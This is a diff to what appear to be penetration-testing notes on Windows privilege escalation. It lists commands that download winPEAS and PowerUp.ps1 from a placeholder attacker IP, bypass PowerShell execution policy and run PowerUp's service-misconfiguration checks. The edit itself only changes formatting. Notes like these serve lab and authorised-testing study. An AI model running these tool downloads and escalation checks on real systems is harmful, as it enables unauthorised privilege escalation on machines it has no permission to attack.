@@ -132,27 +132,27 @@ iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
 ```batch
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 ```
+
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/PowerUp.ps1 -Outfile PowerUp.ps1
 ```
+
 ```powershell
 powershell -ep bypass
 ```
+
 ```powershell
 . .\PowerUp.ps1
 ```
+
 ```powershell
 Get-ModifiableServiceFile
 ```
-```
-<insert output here>
-```
+
 ```powershell
 Get-UnquotedService
 ```
-```
-<insert output here>
-```
+
 ```
 Invoke-AllChecks
 ```
